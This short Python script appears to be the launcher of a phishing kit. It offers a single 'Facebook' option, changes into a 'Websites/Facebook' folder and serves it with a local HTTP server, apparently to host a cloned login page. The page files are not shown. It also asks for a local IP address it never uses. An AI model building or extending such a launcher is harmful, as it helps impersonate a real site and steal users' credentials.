import os
import webbrowser

def change_dir(website_name):
  os.chdir(f"Websites/{website_name}")


print('''
Options:
1. Facebook
''')

user_input = input("Choose Option: ")

localip = input("Enter Your Local ipaddress: ")

if user_input == "1":
  change_dir("Facebook")
  os.system("python3 -m http.server")
